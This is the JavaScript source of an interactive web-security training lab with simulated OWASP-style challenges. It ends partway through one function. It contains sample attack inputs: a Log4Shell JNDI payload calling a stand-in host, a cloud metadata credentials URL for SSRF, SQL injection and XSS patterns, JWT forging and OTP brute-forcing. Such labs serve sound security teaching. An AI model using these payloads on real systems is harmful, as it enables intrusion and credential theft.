/* Interactive multi-challenge labs */
const Labs = (() => {
  const esc = (s) => String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  const L = (ru, en) => (I18n.lang() === 'en' ? en : ru);
  let activeChallenge = {}; // code -> challengeId

  function frame(url, bodyHtml) {
    return `<div class="lab-frame">
      <div class="lab-chrome">
        <div class="dots"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span></div>
        <div class="url">${esc(url)}</div>
      </div>
      <div class="lab-body">${bodyHtml}</div>
    </div>`;
  }

  function capture(id) {
    const ch = CHALLENGES.byId(id);
    if (!ch || Store.hasChallenge(id)) {
      if (ch && Store.hasChallenge(id)) showFlag(id, ch.flag, true);
      return;
    }
    Store.setChallengeFlag(id, ch.flag);
    UI.toast(I18n.t('flagCaptured') + ': ' + ch.flag, 'ok');
    UI.refreshNav();
    showFlag(id, ch.flag, false);
    // refresh challenge chips if present
    const strip = document.getElementById('chal-strip');
    if (strip) strip.outerHTML = challengeStrip(ch.code, id);
  }

  function showFlag(id, flag, already) {
    const box = document.getElementById('flag-area');
    if (!box) return;
    box.innerHTML = `<div class="flag-box">
      <div class="flabel">${already ? I18n.t('flagGot') : I18n.t('ctfCaptured')} · ${esc(id)}</div>
      <div class="fval">${esc(flag)}</div>
    </div>`;
  }

  function challengeStrip(code, selectedId) {
    const list = CHALLENGES.byCode(code);
    return `<div class="chal-strip" id="chal-strip">
      ${list.map(c => {
        const done = Store.hasChallenge(c.id);
        const sel = c.id === selectedId;
        return `<button type="button" class="chal-chip ${sel ? 'active' : ''} ${done ? 'done' : ''}"
          onclick="Labs.selectChallenge('${code}','${c.id}')">
          <span class="chal-title">${esc(I18n.pick(c.title))}</span>
          ${done ? '<span class="chal-ok">✓</span>' : ''}
        </button>`;
      }).join('')}
    </div>`;
  }

  function hintPanel(id) {
    const ch = CHALLENGES.byId(id);
    if (!ch) return '';
    const lvl = Store.hintLevel(id);
    const labels = [
      I18n.t('hintLevel1'),
      I18n.t('hintLevel2'),
      I18n.t('hintLevel3'),
    ];
    let body = '';
    for (let i = 0; i < 3; i++) {
      if (lvl > i) {
        body += `<div class="hint-card open"><div class="hint-lv">${labels[i]}</div>
          <div class="hint-tx">${esc(I18n.pick(ch.hints[i]))}</div></div>`;
      } else if (lvl === i) {
        body += `<button class="btn btns hint-btn" onclick="Labs.revealHint('${id}',${i + 1})">${labels[i]} →</button>`;
        break;
      }
    }
    if (lvl >= 3) {
      /* all open */
    } else if (lvl === 0) {
      body = `<button class="btn btns hint-btn" onclick="Labs.revealHint('${id}',1)">${labels[0]} →</button>`;
    }
    return `<div class="hint-panel" id="hint-panel">
      <div class="hint-head">${I18n.t('hintLadder')}</div>
      <div class="hint-body">${body}</div>
    </div>`;
  }

  function revealHint(id, level) {
    Store.revealHint(id, level);
    const panel = document.getElementById('hint-panel');
    if (panel) panel.outerHTML = hintPanel(id);
  }

  function goalBox(ch) {
    return `<div class="goal">
      <div class="row-between">
        <strong>${esc(I18n.pick(ch.title))}</strong>
        ${Store.hasChallenge(ch.id) ? '<span class="tag tm">✓</span>' : ''}
      </div>
      <div class="flag-hint">${esc(I18n.pick(ch.goal))}</div>
      ${Store.hasChallenge(ch.id) ? `<div class="flag-hint" style="color:var(--grn)">${I18n.t('flagGot')}: <code class="inline">${esc(ch.flag)}</code></div>` : ''}
    </div>`;
  }

  function selectChallenge(code, id) {
    activeChallenge[code] = id;
    const labRoot = document.getElementById('lab-dynamic');
    if (labRoot) {
      labRoot.innerHTML = renderChallengeBody(code, id);
    }
    const strip = document.getElementById('chal-strip');
    if (strip) strip.outerHTML = challengeStrip(code, id);
  }

  function render(code) {
    const list = CHALLENGES.byCode(code);
    const id = activeChallenge[code] || list[0]?.id;
    activeChallenge[code] = id;
    return `
      ${challengeStrip(code, id)}
      <div id="lab-dynamic">${renderChallengeBody(code, id)}</div>
    `;
  }

  /**
   * Modules with optional SQL research (SqlLab.TASKS) + always SQLi challenges.
   * Terminal lives only in practice — never in the header.
   */
  function sqlContextFor(code, challengeId) {
    const id = challengeId || '';
    const isSqli = /sqli/i.test(id);
    const task = (typeof SqlLab !== 'undefined' && SqlLab.TASKS) ? SqlLab.TASKS[code] : null;
    if (isSqli) {
      return {
        db: 'attack',
        sql: "SELECT * FROM secrets;\n-- also: users, products, orders",
        note: I18n.lang() === 'en'
          ? 'SQLi lab — Attack DB (users / products / orders / secrets).'
          : 'SQLi-лаба — Attack DB (users / products / orders / secrets).',
      };
    }
    if (task && (task.db === 'attack' || task.db === 'main')) {
      const en = I18n.lang() === 'en';
      return {
        db: task.db,
        sql: task.hint || "SELECT name FROM sqlite_master WHERE type='table';",
        note: en
          ? (`SQL research · ${task.db === 'attack' ? 'Attack DB' : 'RØOT DB'}: ${task.descEn || task.desc || ''}`)
          : (`SQL-исследование · ${task.db === 'attack' ? 'Attack DB' : 'RØOT БД'}: ${task.desc || task.descEn || ''}`),
      };
    }
    return null;
  }

  /** Open bottom SQL terminal for lab practice only (not header). */
  function openSqlPractice(db, sql) {
    const which = db === 'main' ? 'main' : 'attack';
    const starter = (sql && String(sql).trim())
      ? String(sql)
      : (which === 'attack'
        ? "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;\n-- Attack DB: users, products, orders, secrets"
        : "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;");
    if (typeof SqlLab !== 'undefined' && SqlLab.setQuery) {
      SqlLab.setQuery(starter, which);
    } else if (typeof UI !== 'undefined' && UI.openTerm) {
      UI.openTerm(true);
    }
  }

  function sqlPracticeBar(ctx) {
    if (!ctx) return '';
    const en = I18n.lang() === 'en';
    const db = ctx.db || 'attack';
    const label = db === 'attack'
      ? (en ? 'SQL terminal · Attack DB' : 'SQL-терминал · Attack DB')
      : (en ? 'SQL terminal · RØOT DB' : 'SQL-терминал · RØOT БД');
    // Escape for HTML attribute: use data + onclick via single-quoted JS
    const sqlAttr = String(ctx.sql || '')
      .replace(/\\/g, '\\\\')
      .replace(/'/g, "\\'")
      .replace(/\n/g, '\\n');
    return `
      <div class="row mb12 sql-practice-bar" style="flex-wrap:wrap;gap:8px;align-items:center">
        <button type="button" class="btn btnp"
          onclick="Labs.openSqlPractice('${db}','${sqlAttr}')">${label}</button>
        <span class="muted small">${esc(ctx.note || '')}</span>
      </div>`;
  }

  function renderChallengeBody(code, id) {
    const ch = CHALLENGES.byId(id);
    if (!ch) return '<p>Challenge not found</p>';
    const fn = bodies[id] || bodies[code + '-default'];
    const ctx = sqlContextFor(code, id);
    const taskBar = sqlPracticeBar(ctx);
    return `
      ${goalBox(ch)}
      ${hintPanel(id)}
      ${taskBar}
      ${fn ? fn(ch) : frame('about:blank', '<p>No UI</p>')}
      <div id="flag-area">${Store.hasChallenge(id) ? `<div class="flag-box"><div class="flabel">${I18n.t('yourFlag')}</div><div class="fval">${esc(ch.flag)}</div></div>` : ''}</div>
    `;
  }

  /* shared data */
  const DB = {
    users: [
      { id: 1, username: 'admin', password: 'admin123', role: 'admin', email: 'admin@corp.local', api_key: 'sk-prod-9f2k1p8mN3xQ' },
      { id: 2, username: 'alice', password: 'alice', role: 'user', email: 'alice@corp.local', hometown: 'Springfield', api_key: 'sk-user-2a4b6c8d' },
      { id: 3, username: 'bob', password: 'password', role: 'user', email: 'bob@corp.local', api_key: 'sk-user-8d2e9f1a' },
    ],
    orders: [
      { id: 100, userId: 1, product: 'Legacy DB Access', total: 999, note: 'ADMIN INTERNAL', status: 'completed' },
      { id: 101, userId: 2, product: 'Public Widget', total: 9.99, note: 'gift for mom', status: 'completed' },
      { id: 102, userId: 3, product: 'Premium Module', total: 299, note: 'invoice #B-102', status: 'pending' },
      { id: 103, userId: 1, product: 'Secret Red Team Pack', total: 0, note: 'FLAG carrier order', status: 'completed' },
    ],
    secrets: [
      { key: 'AWS_ACCESS_KEY', value: 'AKIAIOSFODNN7EXAMPLE' },
      { key: 'DB_PASSWORD', value: 'Pr0d_DB_P@ssw0rd!2024#' },
      { key: 'CTF_FLAG', value: 'FLAG{sqli_union_leaks_secrets}' },
    ],
    logs: [
      '2024-03-15 03:40:01 INFO  [http] GET /login 200',
      '2024-03-15 03:41:12 WARN  [auth] FAIL user=admin ip=185.220.101.47 attempt=1',
      '2024-03-15 03:41:13 WARN  [auth] FAIL user=admin ip=185.220.101.47 attempt=2',
      '2024-03-15 03:41:14 WARN  [auth] FAIL user=admin ip=185.220.101.47 attempt=3',
      '2024-03-15 03:41:15 WARN  [auth] FAIL user=admin ip=185.220.101.47 attempt=12',
      '2024-03-15 03:41:20 WARN  [auth] FAIL user=admin ip=185.220.101.47 attempt=47',
      '2024-03-15 03:41:21 CRIT  [auth] SUCCESS user=admin ip=185.220.101.47 after 47 fails',
      '2024-03-15 03:42:00 INFO  [http] GET /admin/export 200 user=admin',
      '2024-03-15 03:42:05 INFO  [data] BULK_DOWNLOAD table=customers rows=1400000 ip=185.220.101.47',
    ],
  };

  function b64url(obj) {
    return btoa(JSON.stringify(obj)).replace(/=+$/,'').replace(/\+/g,'-').replace(/\//g,'_');
  }

  /* ═══════ Challenge UIs ═══════ */
  const bodies = {};

  bodies['a01-idor-order'] = () => frame('https://shop.local/api/orders/{id}', `
    <h3>CorpShop API — Orders</h3>
    <p class="muted">${L('Сессия','Session')}: <strong>alice</strong> (user_id=2). ${L('Свой заказ','Your order')}: 101</p>
    <div class="field"><label>Order ID</label><input id="a01-id" type="number" value="101"></div>
    <button class="btn btnp" onclick="Labs.a01Fetch()">${L('Запросить','Fetch')} GET</button>
    <div id="a01-out"></div>
  `);
  bodies['a01-mass-enum'] = () => frame('https://shop.local/api/orders/{id}', `
    <h3>Order enumerator</h3>
    <p class="muted">${L('Перебери id и найди Secret Red Team Pack','Enumerate ids and find Secret Red Team Pack')}</p>
    <div class="field"><label>Order ID</label><input id="a01e-id" type="number" value="100"></div>
    <div class="row">
      <button class="btn btnp" onclick="Labs.a01EnumOne()">GET</button>
      <button class="btn" onclick="Labs.a01EnumAll()">${L('Сканировать 100–110','Scan 100–110')}</button>
    </div>
    <div id="a01e-out"></div>
  `);
  bodies['a01-vert-priv'] = () => frame('https://shop.local/api/profile', `
    <h3>Profile promote</h3>
    <p class="muted">${L('Сервер доверяет role из body','Server trusts role from body')}</p>
    <div class="field"><label>JSON body</label>
      <textarea id="a01v-body" rows="3">{"name":"alice","role":"user"}</textarea></div>
    <button class="btn btnp" onclick="Labs.a01Promote()">POST /api/profile</button>
    <div id="a01v-out"></div>
  `);

  bodies['a02-jwt-none'] = () => {
    const userJwt = b64url({alg:'HS256',typ:'JWT'}) + '.' + b64url({sub:'alice',role:'user'}) + '.fakesig';
    return frame('https://app.local/jwt', `
      <h3>JWT alg:none</h3>
      <div class="field"><label>JWT</label><textarea id="a02-jwt" rows="3">${userJwt}</textarea></div>
      <div class="row">
        <button class="btn" onclick="Labs.a02None()">${L('Собрать alg:none + admin','Build alg:none + admin')}</button>
        <button class="btn btnp" onclick="Labs.a02VerifyNone()">Verify</button>
      </div>
      <div id="a02-out"></div>
    `);
  };
  bodies['a02-weak-secret'] = () => frame('https://app.local/jwt-hs', `
    <h3>HS256 weak secret</h3>
    <div class="field"><label>HMAC secret</label><input id="a02w-sec" value="" placeholder="guess…"></div>
    <div class="field"><label>role claim</label><input id="a02w-role" value="admin"></div>
    <button class="btn btnp" onclick="Labs.a02WeakSign()">Sign & verify</button>
    <div id="a02w-out"></div>
  `);
  bodies['a02-claim-tamper'] = () => frame('https://app.local/jwt-debug', `
    <h3>Debug: signature check OFF</h3>
    <label class="row mb8"><input type="checkbox" id="a02d-dbg"> ${L('Включить debug verify off','Enable debug verify off')}</label>
    <div class="field"><label>JWT</label>
      <textarea id="a02d-jwt" rows="3">${b64url({alg:'HS256',typ:'JWT'})}.${b64url({sub:'alice',role:'user'})}.xxx</textarea></div>
    <div class="row">
      <button class="btn" onclick="Labs.a02dAdmin()">${L('Подставить role=admin','Set role=admin')}</button>
      <button class="btn btnp" onclick="Labs.a02dVerify()">Verify</button>
    </div>
    <div id="a02d-out"></div>
  `);

  bodies['a03-sqli-bypass'] = () => frame('https://app.local/login', `
    <h3>Login (SQLi)</h3>
    <div class="field"><label>Username</label><input id="a03-user"></div>
    <div class="field"><label>Password</label><input id="a03-pass"></div>
    <button class="btn btnp" onclick="Labs.a03Login()">Login</button>
    <div class="http-line" id="a03-sql">—</div>
    <div id="a03-out"></div>
  `);
  bodies['a03-xss-reflected'] = () => frame('https://app.local/search', `
    <h3>Search (XSS sink)</h3>
    <div class="field"><label>q</label><input id="a03x-q" placeholder="widget"></div>
    <button class="btn btnp" onclick="Labs.a03Xss()">Search</button>
    <div id="a03x-out"></div>
  `);
  bodies['a03-sqli-union'] = () => frame('https://app.local/login', `
    <h3>Login UNION extract</h3>
    <p class="muted">${L('Используй UNION в username','Use UNION in username')}</p>
    <div class="field"><label>Username</label><input id="a03u-user" style="font-family:var(--mono)"></div>
    <div class="field"><label>Password</label><input id="a03u-pass" value="x"></div>
    <button class="btn btnp" onclick="Labs.a03Union()">Login</button>
    <div id="a03u-out"></div>
  `);

  let otpSecret = '0000';
  bodies['a04-otp-brute'] = () => {
    otpSecret = String(Math.floor(1000 + Math.random() * 9000));
    return frame('https://bank.local/2fa', `
      <h3>4-digit OTP</h3>
      <div class="field"><label>OTP</label><input id="a04-otp" maxlength="4"></div>
      <div class="row">
        <button class="btn btnp" onclick="Labs.a04Check()">Verify</button>
        <button class="btn btnd" onclick="Labs.a04Brute()">Auto brute</button>
      </div>
      <div id="a04-out"></div>
    `);
  };
  bodies['a04-sec-question'] = () => frame('https://bank.local/reset', `
    <h3>Password reset</h3>
    <p class="muted">${L('Профиль alice','Alice profile')}: hometown=<code class="inline">Springfield</code></p>
    <div class="field"><label>${L('Секретный вопрос: город рождения?','Security question: birth city?')}</label>
      <input id="a04s-ans" placeholder="…"></div>
    <button class="btn btnp" onclick="Labs.a04SecQ()">${L('Сбросить пароль','Reset password')}</button>
    <div id="a04s-out"></div>
  `);
  bodies['a04-neg-balance'] = () => frame('https://shop.local/cart', `
    <h3>Checkout</h3>
    <p class="muted">${L('Товар $10 — попробуй quantity ≤ 0','Item $10 — try quantity ≤ 0')}</p>
    <div class="field"><label>quantity</label><input id="a04b-q" type="number" value="1"></div>
    <button class="btn btnp" onclick="Labs.a04Biz()">Checkout</button>
    <div id="a04b-out"></div>
  `);

  bodies['a05-debug-leak'] = () => frame('https://api.local/boom', `
    <h3>DEBUG=True API</h3>
    <div class="field"><label>path</label><input id="a05-path" value="/api/user/99999"></div>
    <button class="btn btnp" onclick="Labs.a05Crash()">Trigger 500</button>
    <div id="a05-out"></div>
  `);
  bodies['a05-cors-star'] = () => frame('https://api.local/headers', `
    <h3>Header inspection</h3>
    <button class="btn btnp" onclick="Labs.a05Headers()">${L('Проверить headers','Check headers')}</button>
    <div class="field mt12"><label>${L('Опасный header (вставь строку)','Dangerous header line')}</label>
      <input id="a05c-ans" placeholder="Access-Control-…"></div>
    <button class="btn" onclick="Labs.a05CorsSubmit()">${L('Подтвердить finding','Confirm finding')}</button>
    <div id="a05c-out"></div>
  `);
  bodies['a05-default-creds'] = () => frame('https://admin.local/login', `
    <h3>Admin panel</h3>
    <div class="field"><label>user</label><input id="a05d-u"></div>
    <div class="field"><label>pass</label><input id="a05d-p" type="password"></div>
    <button class="btn btnp" onclick="Labs.a05Default()">Login</button>
    <div id="a05d-out"></div>
  `);

  bodies['a06-log4shell'] = () => frame('https://logs.local/ingest', `
    <h3>log4j 2.14.0</h3>
    <div class="field"><label>User-Agent</label><input id="a06-ua" value="Mozilla/5.0"></div>
    <div class="row">
      <button class="btn" onclick="Labs.a06Payload()">Insert payload</button>
      <button class="btn btnp" onclick="Labs.a06Send()">Send</button>
    </div>
    <div id="a06-out"></div>
  `);
  bodies['a06-sbom-cve'] = () => frame('https://ci.local/sbom', `
    <h3>SBOM excerpt</h3>
    <div class="ebox">log4j-core==2.14.0     CVE-2021-44228  CVSS 10.0
spring-beans==5.3.17  CVE-2022-22965  CVSS 9.8
jackson-databind==2.9.8</div>
    <div class="field"><label>CVE for log4j-core 2.14.0</label><input id="a06s-cve" placeholder="CVE-…"></div>
    <button class="btn btnp" onclick="Labs.a06Sbom()">Submit</button>
    <div id="a06s-out"></div>
  `);
  bodies['a06-jndi-bypass'] = () => frame('https://logs.local/ingest', `
    <h3>Filter: blocks plain "jndi"</h3>
    <div class="field"><label>User-Agent</label><input id="a06b-ua"></div>
    <button class="btn btnp" onclick="Labs.a06Bypass()">Send</button>
    <div id="a06b-out"></div>
  `);

  bodies['a07-session-forge'] = () => frame('https://app.local/login', `
    <h3>Predictable session</h3>
    <div class="g2">
      <div>
        <div class="field"><label>user</label><input id="a07-user" value="alice"></div>
        <div class="field"><label>pass</label><input id="a07-pass" value="alice"></div>
        <button class="btn btnp" onclick="Labs.a07Login()">Login</button>
      </div>
      <div>
        <div class="field"><label>Cookie session</label><input id="a07-cookie"></div>
        <button class="btn" onclick="Labs.a07Forge()">Forge admin</button>
        <button class="btn btnp" onclick="Labs.a07Me()">GET /api/me</button>
      </div>
    </div>
    <div id="a07-out"></div>
  `);
  bodies['a07-stuffing'] = () => frame('https://app.local/login', `
    <h3>Leaked dump (sample)</h3>
    <div class="ebox">bob:password
alice:alice
admin:admin123</div>
    <div class="field"><label>user</label><input id="a07s-u"></div>
    <div class="field"><label>pass</label><input id="a07s-p"></div>
    <button class="btn btnp" onclick="Labs.a07Stuff()">Login</button>
    <div id="a07s-out"></div>
  `);
  bodies['a07-no-mfa'] = () => frame('https://app.local/mfa', `
    <h3>Login + MFA (UI only)</h3>
    <div class="field"><label>user</label><input id="a07m-u" value="alice"></div>
    <div class="field"><label>pass</label><input id="a07m-p" value="alice"></div>
    <div class="row">
      <button class="btn btnp" onclick="Labs.a07MfaLogin()">Login</button>
      <button class="btn" onclick="Labs.a07MfaSensitive()">${L('Sensitive API (skip MFA)','Sensitive API (skip MFA)')}</button>
    </div>
    <div id="a07m-out"></div>
  `);

  bodies['a08-deser-role'] = () => frame('https://app.local/', `
    <h3>Serialized profile</h3>
    <div class="field"><label>Cookie</label>
      <textarea id="a08-c" rows="2">O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:2;}</textarea></div>
    <div class="row">
      <button class="btn" onclick="Labs.a08Admin()">role=admin</button>
      <button class="btn btnp" onclick="Labs.a08Load()">Load</button>
    </div>
    <div id="a08-out"></div>
  `);
  bodies['a08-deser-id'] = () => frame('https://app.local/mailbox', `
    <h3>Mailbox by serialized id</h3>
    <div class="field"><label>Cookie</label>
      <textarea id="a08i-c" rows="2">O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:2;}</textarea></div>
    <button class="btn btnp" onclick="Labs.a08IdLoad()">Open mailbox</button>
    <div id="a08i-out"></div>
  `);
  bodies['a08-unsigned-update'] = () => frame('https://app.local/plugins', `
    <h3>Plugin install (no signature)</h3>
    <div class="field"><label>Plugin URL</label><input id="a08p-url" placeholder="https://…"></div>
    <button class="btn btnp" onclick="Labs.a08Plugin()">Install</button>
    <div id="a08p-out"></div>
  `);

  bodies['a09-hunt-ip'] = () => frame('https://siem.local/', `
    <h3>SIEM logs</h3>
    <div class="ebox scroll-y" style="max-height:180px">${esc(DB.logs.join('\n'))}</div>
    <div class="field"><label>Attacker IP</label><input id="a09-ip"></div>
    <div class="field"><label>${L('Описание','Description')}</label><input id="a09-what" placeholder="bruteforce export"></div>
    <button class="btn btnp" onclick="Labs.a09Ip()">Submit</button>
    <div id="a09-out"></div>
  `);
  bodies['a09-count-fails'] = () => frame('https://siem.local/', `
    <h3>Count attempts</h3>
    <div class="ebox scroll-y" style="max-height:160px">${esc(DB.logs.join('\n'))}</div>
    <div class="field"><label>${L('Число FAIL attempt до SUCCESS','FAIL attempts before SUCCESS')}</label>
      <input id="a09c-n" type="number"></div>
    <button class="btn btnp" onclick="Labs.a09Count()">Submit</button>
    <div id="a09c-out"></div>
  `);
  bodies['a09-exfil-table'] = () => frame('https://siem.local/', `
    <h3>BULK_DOWNLOAD</h3>
    <div class="ebox scroll-y" style="max-height:160px">${esc(DB.logs.join('\n'))}</div>
    <div class="field"><label>table=</label><input id="a09t-t"></div>
    <button class="btn btnp" onclick="Labs.a09Table()">Submit</button>
    <div id="a09t-out"></div>
  `);

  bodies['a10-imds'] = () => frame('https://app.local/webhook', `
    <h3>Webhook fetcher</h3>
    <div class="field"><label>URL</label><input id="a10-url" value="https://example.com"></div>
    <div class="row">
      <button class="btn" onclick="document.getElementById('a10-url').value='http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role'">IAM creds</button>
      <button class="btn btnp" onclick="Labs.a10Fetch()">Fetch</button>
    </div>
    <div id="a10-out"></div>
  `);
  bodies['a10-localhost'] = () => frame('https://app.local/webhook', `
    <h3>Internal fetch</h3>
    <div class="field"><label>URL</label><input id="a10l-url" value="http://example.com"></div>
    <div class="row">
      <button class="btn" onclick="document.getElementById('a10l-url').value='http://127.0.0.1:8080/admin'">localhost</button>
      <button class="btn btnp" onclick="Labs.a10Local()">Fetch</button>
    </div>
    <div id="a10l-out"></div>
  `);
  bodies['a10-fail-open'] = () => frame('https://app.local/webhook', `
    <h3>Error handling</h3>
    <div class="field"><label>URL</label><input id="a10f-url" value="http://bad.invalid:1/"></div>
    <button class="btn btnp" onclick="Labs.a10Fail()">Fetch</button>
    <div id="a10f-out"></div>
  `);

  /* ═══════ Handlers ═══════ */
  function a01Fetch() {
    const id = +document.getElementById('a01-id').value;
    const order = DB.orders.find(o => o.id === id);
    const out = document.getElementById('a01-out');
    if (!order) { out.innerHTML = `<div class="resp err">404</div>`; return; }
    out.innerHTML = `<div class="resp ${order.userId===2?'ok':'warn'}">${esc(JSON.stringify(order,null,2))}</div>`;
    if (order.id === 100 && order.userId === 1) capture('a01-idor-order');
  }
  function a01EnumOne() {
    const id = +document.getElementById('a01e-id').value;
    const order = DB.orders.find(o => o.id === id);
    const out = document.getElementById('a01e-out');
    if (!order) { out.innerHTML = `<div class="resp err">404 id=${id}</div>`; return; }
    out.innerHTML = `<div class="resp info">${esc(JSON.stringify(order,null,2))}</div>`;
    if (/Secret Red Team/i.test(order.product)) capture('a01-mass-enum');
  }
  function a01EnumAll() {
    const rows = [];
    for (let i = 100; i <= 110; i++) {
      const o = DB.orders.find(x => x.id === i);
      rows.push(o ? `${i}: ${o.product} (user ${o.userId})` : `${i}: —`);
      if (o && /Secret Red Team/i.test(o.product)) capture('a01-mass-enum');
    }
    document.getElementById('a01e-out').innerHTML = `<div class="resp info">${esc(rows.join('\n'))}</div>`;
  }
  function a01Promote() {
    try {
      const body = JSON.parse(document.getElementById('a01v-body').value);
      const out = document.getElementById('a01v-out');
      if (body.role === 'admin') {
        out.innerHTML = `<div class="resp ok">200 {"role":"admin","panel":"unlocked"}</div>`;
        capture('a01-vert-priv');
      } else out.innerHTML = `<div class="resp info">200 ${esc(JSON.stringify(body))}</div>`;
    } catch (e) {
      document.getElementById('a01v-out').innerHTML = `<div class="resp err">${esc(e.message)}</div>`;
    }
  }

  function a02None() {
    document.getElementById('a02-jwt').value =
      b64url({alg:'none',typ:'JWT'}) + '.' + b64url({sub:'alice',role:'admin'}) + '.';
  }
  function a02VerifyNone() {
    const token = document.getElementById('a02-jwt').value.trim();
    const out = document.getElementById('a02-out');
    try {
      const parts = token.split('.');
      const pad = (s) => s + '==='.slice((s.length + 3) % 4);
      const header = JSON.parse(atob(pad(parts[0].replace(/-/g,'+').replace(/_/g,'/'))));
      const payload = JSON.parse(atob(pad(parts[1].replace(/-/g,'+').replace(/_/g,'/'))));
      const ok = /none/i.test(header.alg) || parts[2] === 'fakesig';
      if (!ok) { out.innerHTML = `<div class="resp err">401 invalid signature</div>`; return; }
      if (payload.role === 'admin' && /none/i.test(header.alg)) {
        out.innerHTML = `<div class="resp ok">200 admin secret ok</div>`;
        capture('a02-jwt-none');
      } else out.innerHTML = `<div class="resp info">200 role=${esc(payload.role)}</div>`;
    } catch (e) { out.innerHTML = `<div class="resp err">${esc(e.message)}</div>`; }
  }
  function a02WeakSign() {
    const sec = document.getElementById('a02w-sec').value;
    const role = document.getElementById('a02w-role').value;
    const out = document.getElementById('a02w-out');
    // simulated: only secret "secret" accepted
    if (sec === 'secret' && role === 'admin') {
      out.innerHTML = `<div class="resp ok">HS256 verified with weak secret → admin</div>`;
      capture('a02-weak-secret');
    } else if (sec === 'secret') {
      out.innerHTML = `<div class="resp info">Valid signature, role=${esc(role)}</div>`;
    } else out.innerHTML = `<div class="resp err">401 bad signature (wrong secret)</div>`;
  }
  function a02dAdmin() {
    const h = b64url({alg:'HS256',typ:'JWT'});
    const p = b64url({sub:'alice',role:'admin'});
    document.getElementById('a02d-jwt').value = h + '.' + p + '.ignored';
  }
  function a02dVerify() {
    const dbg = document.getElementById('a02d-dbg').checked;
    const out = document.getElementById('a02d-out');
    if (!dbg) { out.innerHTML = `<div class="resp err">401 (debug off — signature required)</div>`; return; }
    try {
      const parts = document.getElementById('a02d-jwt').value.trim().split('.');
      const pad = (s) => s + '==='.slice((s.length + 3) % 4);
      const payload = JSON.parse(atob(pad(parts[1].replace(/-/g,'+').replace(/_/g,'/'))));
      if (payload.role === 'admin') {
        out.innerHTML = `<div class="resp ok">200 debug accept — role=admin</div>`;
        capture('a02-claim-tamper');
      } else out.innerHTML = `<div class="resp info">200 role=${esc(payload.role)}</div>`;
    } catch (e) { out.innerHTML = `<div class="resp err">${esc(e.message)}</div>`; }
  }

  function a03Login() {
    const user = document.getElementById('a03-user').value;
    const pass = document.getElementById('a03-pass').value;
    const sql = `SELECT * FROM users WHERE username='${user}' AND password='${pass}'`;
    document.getElementById('a03-sql').textContent = sql;
    const out = document.getElementById('a03-out');
    const bypass = /'?\s*or\s+'?1'?\s*=\s*'?1/i.test(user + pass) || /admin'\s*--/i.test(user) || /'--/.test(user);
    if (bypass || (user === 'admin' && pass === 'admin123')) {
      out.innerHTML = `<div class="resp ok">200 login admin</div>`;
      if (bypass) capture('a03-sqli-bypass');
    } else {
      const u = DB.users.find(x => x.username === user && x.password === pass);
      out.innerHTML = u ? `<div class="resp ok">200 ${esc(u.username)}</div>` : `<div class="resp err">401</div>`;
    }
  }
  function a03Xss() {
    const q = document.getElementById('a03x-q').value;
    const out = document.getElementById('a03x-out');
    out.innerHTML = `<div class="resp info">Results for: ${esc(q)}</div>`;
    if (/<script|onerror\s*=|onload\s*=/i.test(q)) capture('a03-xss-reflected');
  }
  function a03Union() {
    const user = document.getElementById('a03u-user').value;
    const out = document.getElementById('a03u-out');
    if (/union\s+select/i.test(user) && /secret/i.test(user)) {
      out.innerHTML = `<div class="resp ok">${esc(JSON.stringify(DB.secrets, null, 2))}</div>`;
      capture('a03-sqli-union');
    } else out.innerHTML = `<div class="resp err">401 or empty union</div>`;
  }

  function a04Check() {
    const v = document.getElementById('a04-otp').value.trim();
    const out = document.getElementById('a04-out');
    if (v === otpSecret) {
      out.innerHTML = `<div class="resp ok">OTP ok</div>`;
      capture('a04-otp-brute');
    } else out.innerHTML = `<div class="resp err">invalid OTP</div>`;
  }
  function a04Brute() {
    const out = document.getElementById('a04-out');
    const target = parseInt(otpSecret, 10);
    let i = 0;
    function tick() {
      const end = Math.min(i + 800, 10000);
      for (; i < end; i++) {
        if (i === target) {
          document.getElementById('a04-otp').value = otpSecret;
          out.innerHTML = `<div class="resp ok">Cracked ${otpSecret} in ${i + 1} tries</div>`;
          capture('a04-otp-brute');
          return;
        }
      }
      out.innerHTML = `<div class="resp warn">${i}/10000…</div>`;
      if (i < 10000) requestAnimationFrame(tick);
    }
    tick();
  }
  function a04SecQ() {
    const a = document.getElementById('a04s-ans').value.trim().toLowerCase();
    const out = document.getElementById('a04s-out');
    if (a === 'springfield') {
      out.innerHTML = `<div class="resp ok">Password reset link sent (design fail)</div>`;
      capture('a04-sec-question');
    } else out.innerHTML = `<div class="resp err">Wrong answer</div>`;
  }
  function a04Biz() {
    const q = +document.getElementById('a04b-q').value;
    const total = 10 * q;
    const out = document.getElementById('a04b-out');
    if (q <= 0) {
      out.innerHTML = `<div class="resp ok">200 checkout total=${total} (accepted!)</div>`;
      capture('a04-neg-balance');
    } else out.innerHTML = `<div class="resp info">200 total=${total}</div>`;
  }

  function a05Crash() {
    const flag = CHALLENGES.byId('a05-debug-leak').flag;
    document.getElementById('a05-out').innerHTML = `<div class="resp err">HTTP 500
DEBUG=True
SECRET_KEY = django-insecure-${flag}
</div>`;
    capture('a05-debug-leak');
  }
  function a05Headers() {
    document.getElementById('a05c-out').innerHTML = `<div class="resp warn">Server: Apache/2.4.49
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
X-Powered-By: PHP/7.4.3
(no CSP / HSTS)
</div>`;
  }
  function a05CorsSubmit() {
    const v = document.getElementById('a05c-ans').value.toLowerCase();
    if (v.includes('access-control-allow-origin') && (v.includes('*') || v.includes('credentials'))) {
      document.getElementById('a05c-out').innerHTML += `<div class="resp ok mt8">Finding accepted</div>`;
      capture('a05-cors-star');
    } else {
      document.getElementById('a05c-out').innerHTML += `<div class="resp err mt8">Not quite — include ACAO *</div>`;
    }
  }
  function a05Default() {
    const u = document.getElementById('a05d-u').value;
    const p = document.getElementById('a05d-p').value;
    const out = document.getElementById('a05d-out');
    if (u === 'admin' && p === 'admin') {
      out.innerHTML = `<div class="resp ok">200 admin panel</div>`;
      capture('a05-default-creds');
    } else out.innerHTML = `<div class="resp err">401</div>`;
  }

  function a06Payload() {
    document.getElementById('a06-ua').value = '${jndi:ldap://evil.oast.fun/x}';
  }
  function a06Send() {
    const ua = document.getElementById('a06-ua').value;
